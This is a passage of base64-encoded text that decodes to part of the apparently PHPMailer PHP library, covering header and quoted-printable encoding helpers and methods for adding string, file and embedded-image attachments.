uIGlzOgogICAgICAgICAgICAvLyBtYXggbGluZSBsZW5ndGgKICAgICAgICAgICAgLy8gLSBzaG9ydGVuIHRvIGF2b2lkIG1haWwoKSBjb3JydXB0aW9uCiAgICAgICAgICAgIC8vIC0gUS9CIGVuY29kaW5nIGNoYXIgb3ZlcmhlYWQgKCJgID0/PGNoYXJzZXQ+P1tRQl0/PGNvbnRlbnQ+Pz1gIikKICAgICAgICAgICAgLy8gLSBjaGFyc2V0IG5hbWUgbGVuZ3RoCiAgICAgICAgICAgICRtYXhsZW4gPSBzdGF0aWM6OlNURF9MSU5FX0xFTkdUSCAtICRsZW5ndGhzdWIgLSA4IC0gc3RybGVuKCR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXNNdWx0aUJ5dGVzKCRzdHIpKSB7CiAgICAgICAgICAgICAgICAvLyBVc2UgYSBjdXN0b20gZnVuY3Rpb24gd2hpY2ggY29ycmVjdGx5IGVuY29kZXMgYW5kIHdyYXBzIGxvbmcKICAgICAgICAgICAgICAgIC8vIG11bHRpYnl0ZSBzdHJpbmdzIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5iYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgIlxuIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGJhc2U2NF9lbmNvZGUoJHN0cik7CiAgICAgICAgICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0OwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSB0cmltKGNodW5rX3NwbGl0KCRlbmNvZGVkLCAkbWF4bGVuLCAiXG4iKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGVuY29kZWQgPSBwcmVnX3JlcGxhY2UoJy9eKC4qKSQvbScsICcgPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAiPyRlbmNvZGluZz9cXDE/PSIsICRlbmNvZGVkKTsKICAgICAgICB9IGVsc2VpZiAoJG1hdGNoY291bnQgPiAwKSB7CiAgICAgICAgICAgIC8vMSBvciBtb3JlIGNoYXJzIG5lZWQgZW5jb2RpbmcsIHVzZSBRLWVuY29kZQogICAgICAgICAgICAkZW5jb2RpbmcgPSAnUSc7CiAgICAgICAgICAgIC8vUmVjYWxjIG1heCBsaW5lIGxlbmd0aCBmb3IgUSBlbmNvZGluZyAtIHNlZSBjb21tZW50cyBvbiBCIGVuY29kZQogICAgICAgICAgICAkbWF4bGVuID0gc3RhdGljOjpTVERfTElORV9MRU5HVEggLSAkbGVuZ3Roc3ViIC0gOCAtIHN0cmxlbigkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVEoJHN0ciwgJHBvc2l0aW9uKTsKICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+d3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOwogICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCc9JyAuIHN0YXRpYzo6JExFLCAiXG4iLCB0cmltKCRlbmNvZGVkKSk7CiAgICAgICAgICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCcvXiguKikkL20nLCAnID0/JyAuICR0aGlzLT5DaGFyU2V0IC4gIj8kZW5jb2Rpbmc/XFwxPz0iLCAkZW5jb2RlZCk7CiAgICAgICAgfSBlbHNlaWYgKHN0cmxlbigkc3RyKSA+ICRtYXhsZW4pIHsKICAgICAgICAgICAgLy9ObyBjaGFycyBuZWVkIGVuY29kaW5nLCBidXQgbGluZSBpcyB0b28gbG9uZywgc28gZm9sZCBpdAogICAgICAgICAgICAkZW5jb2RlZCA9IHRyaW0oJHRoaXMtPndyYXBUZXh0KCRzdHIsICRtYXhsZW4sIGZhbHNlKSk7CiAgICAgICAgICAgIGlmICgkc3RyID09ICRlbmNvZGVkKSB7CiAgICAgICAgICAgICAgICAvL1dyYXBwaW5nIG5pY2VseSBkaWRuJ3Qgd29yaywgd3JhcCBoYXJkIGluc3RlYWQKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gdHJpbShjaHVua19zcGxpdCgkc3RyLCBzdGF0aWM6OlNURF9MSU5FX0xFTkdUSCwgc3RhdGljOjokTEUpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKHN0YXRpYzo6JExFLCAiXG4iLCB0cmltKCRlbmNvZGVkKSk7CiAgICAgICAgICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCcvXiguKikkL20nLCAnIFxcMScsICRlbmNvZGVkKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL05vIHJlZm9ybWF0dGluZyBuZWVkZWQKICAgICAgICAgICAgcmV0dXJuICRzdHI7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cmltKHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRlbmNvZGVkKSk7CiAgICB9CiAgICAvKioKICAgICAqIENoZWNrIGlmIGEgc3RyaW5nIGNvbnRhaW5zIG11bHRpLWJ5dGUgY2hhcmFjdGVycy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXNNdWx0aUJ5dGVzKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykpIHsKICAgICAgICAgICAgcmV0dXJuIHN0cmxlbigkc3RyKSA+IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgfQogICAgICAgIC8vIEFzc3VtZSBubyBtdWx0aWJ5dGVzICh3ZSBjYW4ndCBoYW5kbGUgd2l0aG91dCBtYnN0cmluZyBmdW5jdGlvbnMgYW55d2F5KQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8qKgogICAgICogRG9lcyBhIHN0cmluZyBjb250YWluIGFueSA4LWJpdCBjaGFycyAoaW4gYW55IGNoYXJzZXQpPwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHRleHQKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhczhiaXRDaGFycygkdGV4dCkKICAgIHsKICAgICAgICByZXR1cm4gKGJvb2wpIHByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS8nLCAkdGV4dCk7CiAgICB9CiAgICAvKioKICAgICAqIEVuY29kZSBhbmQgd3JhcCBsb25nIG11bHRpYnl0ZSBzdHJpbmdzIGZvciBtYWlsIGhlYWRlcnMKICAgICAqIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyLgogICAgICogQWRhcHRlZCBmcm9tIGEgZnVuY3Rpb24gYnkgcGFyYXZvaWQuCiAgICAgKgogICAgICogQHNlZSBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLm1iLWVuY29kZS1taW1laGVhZGVyLnBocCM2MDI4MwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciAgICAgICBtdWx0aS1ieXRlIHRleHQgdG8gd3JhcCBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGxpbmVicmVhayBzdHJpbmcgdG8gdXNlIGFzIGxpbmVmZWVkL2VuZC1vZi1saW5lCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAkbGluZWJyZWFrID0gbnVsbCkKICAgIHsKICAgICAgICAkc3RhcnQgPSAnPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAnP0I/JzsKICAgICAgICAkZW5kID0gJz89JzsKICAgICAgICAkZW5jb2RlZCA9ICcnOwogICAgICAgIGlmIChudWxsID09PSAkbGluZWJyZWFrKSB7CiAgICAgICAgICAgICRsaW5lYnJlYWsgPSBzdGF0aWM6OiRMRTsKICAgICAgICB9CiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy8gRWFjaCBsaW5lIG11c3QgaGF2ZSBsZW5ndGggPD0gNzUsIGluY2x1ZGluZyAkc3RhcnQgYW5kICRlbmQKICAgICAgICAkbGVuZ3RoID0gNzUgLSBzdHJsZW4oJHN0YXJ0KSAtIHN0cmxlbigkZW5kKTsKICAgICAgICAvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8KICAgICAgICAkcmF0aW8gPSAkbWJfbGVuZ3RoIC8gc3RybGVuKCRzdHIpOwogICAgICAgIC8vIEJhc2U2NCBoYXMgYSA0OjMgcmF0aW8KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG1iX2xlbmd0aDsgJGkgKz0gJG9mZnNldCkgewogICAgICAgICAgICAkbG9va0JhY2sgPSAwOwogICAgICAgICAgICBkbyB7CiAgICAgICAgICAgICAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCAtICRsb29rQmFjazsKICAgICAgICAgICAgICAgICRjaHVuayA9IG1iX3N1YnN0cigkc3RyLCAkaSwgJG9mZnNldCwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJGNodW5rID0gYmFzZTY0X2VuY29kZSgkY2h1bmspOwogICAgICAgICAgICAgICAgKyskbG9va0JhY2s7CiAgICAgICAgICAgIH0gd2hpbGUgKHN0cmxlbigkY2h1bmspID4gJGxlbmd0aCk7CiAgICAgICAgICAgICRlbmNvZGVkIC49ICRjaHVuayAuICRsaW5lYnJlYWs7CiAgICAgICAgfQogICAgICAgIC8vIENob21wIHRoZSBsYXN0IGxpbmVmZWVkCiAgICAgICAgcmV0dXJuIHN1YnN0cigkZW5jb2RlZCwgMCwgLXN0cmxlbigkbGluZWJyZWFrKSk7CiAgICB9CiAgICAvKioKICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiBxdW90ZWQtcHJpbnRhYmxlIGZvcm1hdC4KICAgICAqIEFjY29yZGluZyB0byBSRkMyMDQ1IHNlY3Rpb24gNi43LgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgdGV4dCB0byBlbmNvZGUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUVAoJHN0cmluZykKICAgIHsKICAgICAgICByZXR1cm4gc3RhdGljOjpub3JtYWxpemVCcmVha3MocXVvdGVkX3ByaW50YWJsZV9lbmNvZGUoJHN0cmluZykpOwogICAgfQogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgdXNpbmcgUSBlbmNvZGluZy4KICAgICAqCiAgICAgKiBAc2VlIGh0dHA6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIwNDcjc2VjdGlvbi00LjIKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgICAgICB0aGUgdGV4dCB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBvc2l0aW9uIFdoZXJlIHRoZSB0ZXh0IGlzIGdvaW5nIHRvIGJlIHVzZWQsIHNlZSB0aGUgUkZDIGZvciB3aGF0IHRoYXQgbWVhbnMKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpCiAgICB7CiAgICAgICAgLy8gVGhlcmUgc2hvdWxkIG5vdCBiZSBhbnkgRU9MIGluIHRoZSBzdHJpbmcKICAgICAgICAkcGF0dGVybiA9ICcnOwogICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoWyJcciIsICJcbiJdLCAnJywgJHN0cik7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsKICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoKICAgICAgICAgICAgICAgIC8vIFJGQyAyMDQ3IHNlY3Rpb24gNS4zCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdeQS1aYS16MC05ISorXC8gLSc7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgLyoKICAgICAgICAgICAgICogUkZDIDIwNDcgc2VjdGlvbiA1LjIuCiAgICAgICAgICAgICAqIEJ1aWxkICRwYXR0ZXJuIHdpdGhvdXQgaW5jbHVkaW5nIGRlbGltaXRlcnMgYW5kIFtdCiAgICAgICAgICAgICAqLwogICAgICAgICAgICAvKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdcKFwpIic7CiAgICAgICAgICAgIC8qIEludGVudGlvbmFsIGZhbGwgdGhyb3VnaCAqLwogICAgICAgICAgICBjYXNlICd0ZXh0JzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIFJGQyAyMDQ3IHNlY3Rpb24gNS4xCiAgICAgICAgICAgICAgICAvLyBSZXBsYWNlIGV2ZXJ5IGhpZ2ggYXNjaWksIGNvbnRyb2wsID0sID8gYW5kIF8gY2hhcmFjdGVycwogICAgICAgICAgICAgICAgLyoqIEBub2luc3BlY3Rpb24gU3VzcGljaW91c0Fzc2lnbm1lbnRzSW5zcGVjdGlvbiAqLwogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdcMTc3LVwzNzcnIC4gJHBhdHRlcm47CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgJG1hdGNoZXMgPSBbXTsKICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi9beyRwYXR0ZXJufV0vIiwgJGVuY29kZWQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAvLyBJZiB0aGUgc3RyaW5nIGNvbnRhaW5zIGFuICc9JywgbWFrZSBzdXJlIGl0J3MgdGhlIGZpcnN0IHRoaW5nIHdlIHJlcGxhY2UKICAgICAgICAgICAgLy8gc28gYXMgdG8gYXZvaWQgZG91YmxlLWVuY29kaW5nCiAgICAgICAgICAgICRlcWtleSA9IGFycmF5X3NlYXJjaCgnPScsICRtYXRjaGVzWzBdKTsKICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkZXFrZXkpIHsKICAgICAgICAgICAgICAgIHVuc2V0KCRtYXRjaGVzWzBdWyRlcWtleV0pOwogICAgICAgICAgICAgICAgYXJyYXlfdW5zaGlmdCgkbWF0Y2hlc1swXSwgJz0nKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoIChhcnJheV91bmlxdWUoJG1hdGNoZXNbMF0pIGFzICRjaGFyKSB7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCRjaGFyLCAnPScgLiBzcHJpbnRmKCclMDJYJywgb3JkKCRjaGFyKSksICRlbmNvZGVkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBSZXBsYWNlIHNwYWNlcyB3aXRoIF8gKG1vcmUgcmVhZGFibGUgdGhhbiA9MjApCiAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA0LjIoMikKICAgICAgICByZXR1cm4gc3RyX3JlcGxhY2UoJyAnLCAnXycsICRlbmNvZGVkKTsKICAgIH0KICAgIC8qKgogICAgICogQWRkIGEgc3RyaW5nIG9yIGJpbmFyeSBhdHRhY2htZW50IChub24tZmlsZXN5c3RlbSkuCiAgICAgKiBUaGlzIG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsCiAgICAgKiBzdWNoIGFzIGEgQkxPQiByZWNvcmQgZnJvbSBhIGRhdGFiYXNlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyAgICAgIFN0cmluZyBhdHRhY2htZW50IGRhdGEKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lICAgIE5hbWUgb2YgdGhlIGF0dGFjaG1lbnQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nICAgIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdBdHRhY2htZW50KAogICAgICAgICRzdHJpbmcsCiAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCwKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgIGlmICgnJyA9PSAkdHlwZSkgewogICAgICAgICAgICAkdHlwZSA9IHN0YXRpYzo6ZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKTsKICAgICAgICB9CiAgICAgICAgLy8gQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IFsKICAgICAgICAgICAgMCA9PiAkc3RyaW5nLAogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgMiA9PiBiYXNlbmFtZSgkZmlsZW5hbWUpLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiB0cnVlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gMCwKICAgICAgICBdOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgKGlubGluZSkgYXR0YWNobWVudCBmcm9tIGEgZmlsZS4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogVGhlc2UgZGlmZmVyIGZyb20gJ3JlZ3VsYXInIGF0dGFjaG1lbnRzIGluIHRoYXQgdGhleSBhcmUgaW50ZW5kZWQgdG8gYmUKICAgICAqIGRpc3BsYXllZCBpbmxpbmUgd2l0aCB0aGUgbWVzc2FnZSwgbm90IGp1c3QgYXR0YWNoZWQgZm9yIGRvd25sb2FkLgogICAgICogVGhpcyBpcyB1c2VkIGluIEhUTUwgbWVzc2FnZXMgdGhhdCBlbWJlZCB0aGUgaW1hZ2VzCiAgICAgKiB0aGUgSFRNTCByZWZlcnMgdG8gdXNpbmcgdGhlICRjaWQgdmFsdWUuCiAgICAgKiBOZXZlciB1c2UgYSB1c2VyLXN1cHBsaWVkIHBhdGggdG8gYSBmaWxlIQogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggICAgICAgIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCAgICAgICAgIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lICAgICAgICBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgICAgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykKICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgICAgICAgIEZpbGUgTUlNRSB0eXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEVtYmVkZGVkSW1hZ2UoJHBhdGgsICRjaWQsICRuYW1lID0gJycsICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCwgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScpCiAgICB7CiAgICAgICAgaWYgKCFzdGF0aWM6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgfHwgIUBpc19maWxlKCRwYXRoKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgIGlmICgnJyA9PSAkdHlwZSkgewogICAgICAgICAgICAkdHlwZSA9IHN0YXRpYzo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgIH0KICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICAgICAgaWYgKCcnID09ICRuYW1lKSB7CiAgICAgICAgICAgICRuYW1lID0gJGZpbGVuYW1lOwogICAgICAgIH0KICAgICAgICAvLyBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gWwogICAgICAgICAgICAwID0+ICRwYXRoLAogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgIDUgPT4gZmFsc2UsIC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgNyA9PiAkY2lkLAogICAgICAgIF07CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICAvKioKICAgICAqIEFkZCBhbiBlbWJlZGRlZCBzdHJpbmdpZmllZCBhdHRhY2htZW50LgogICAgICogVGhpcyBjYW4gaW5jbHVkZSBpbWFnZXMsIHNvdW5kcywgYW5kIGp1c3QgYWJvdXQgYW55IG90aGVyIGRvY3VtZW50IHR5cGUuCiAgICAgKiBJZiB5b3VyIGZpbGVuYW1lIGRvZXNuJ3QgY29udGFpbiBhbiBleHRlbnNpb24sIGJlIHN1cmUgdG8gc2V0IHRoZSAkdHlwZSB0byBhbiBhcHByb3ByaWF0ZSBNSU1FIHR5cGUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nICAgICAgVGhlIGF0dGFjaG1lbnQgYmluYXJ5IGRhdGEKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCAgICAgICAgIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lICAgICAgICBBIGZpbGVuYW1lIGZvciB0aGUgYXR0YWNobWVudC4gSWYgdGhpcyBjb250YWlucyBhbiBleHRlbnNpb24sCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQSFBNYWlsZXIgd2lsbCBhdHRlbXB0IHRvIHNldCBhIE1JTUUgdHlwZSBmb3IgdGhlIGF0dGFjaG1lbnQuCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb3IgZXhhbXBsZSAnZmlsZS5qcGcnIHdvdWxkIGdldCBhbiAnaW1hZ2UvanBlZycgTUlNRSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgICAgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZyksIGRlZmF1bHRzIHRvICdiYXNlNjQnCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBNSU1FIHR5cGUgLSB3aWxsIGJlIHVzZWQgaW4gcHJlZmVyZW5jZSB0byBhbnkgYXV0b21hdGljYWxseSBkZXJpdmVkIHR5cGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIG9uIHN1Y2Nlc3NmdWxseSBhZGRpbmcgYW4gYXR0YWNobWVudAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nRW1iZWRkZWRJbWFnZSgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRjaWQsCiAgICAgICAgJG5hbWUgPSAnJywKICAgICAgICAkZW5jb2RpbmcgPSBzZWxmOjpFTkNPRElOR19CQVNFNjQsCiAgICAgICAgJHR5cGUgPSAnJywKICAgICAgICAkZGlzcG9zaXRpb24gPSAnaW5saW5lJwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIG5hbWUKICAgICAgICBpZiAoJycgPT0gJHR5cGUgYW5kICFlbXB0eSgkbmFtZSkpIHsKICAgICAgICAgICAgJHR5cGUgPSBzdGF0aWM6OmZpbGVuYW1lVG9UeXBlKCRuYW1lKTsKICAgICAgICB9CiAgICAgICAgLy8gQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IFsKICAgICAgICAgICAgMCA9PiAkc3RyaW5nLAogICAgICAgICAgICAxID0+ICRuYW1lLAogICAgICAgICAgICAyID0+ICRuYW1lLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiB0cnVlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gJGNpZCwKICAgICAgICBdOwogICAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBlbWJlZGRlZCBhdHRhY2htZW50IGlzIHByZXNlbnQgd2l0aCB0aGlzIGNpZC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaWQKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGNpZEV4aXN0cygkY2lkKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgnaW5saW5lJyA9PSAkYXR0YWNobWVudFs2XSBhbmQgJGNpZCA9PSAkYXR0YWNobWVudFs3XSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBpbmxpbmUgYXR0YWNobWVudCBpcyBwcmVzZW50LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5saW5lSW1hZ2VFeGlzdHMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgnaW5saW5lJyA9PSAkYXR0YWNobWVudFs2XSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLyoqCiAgICAgKiB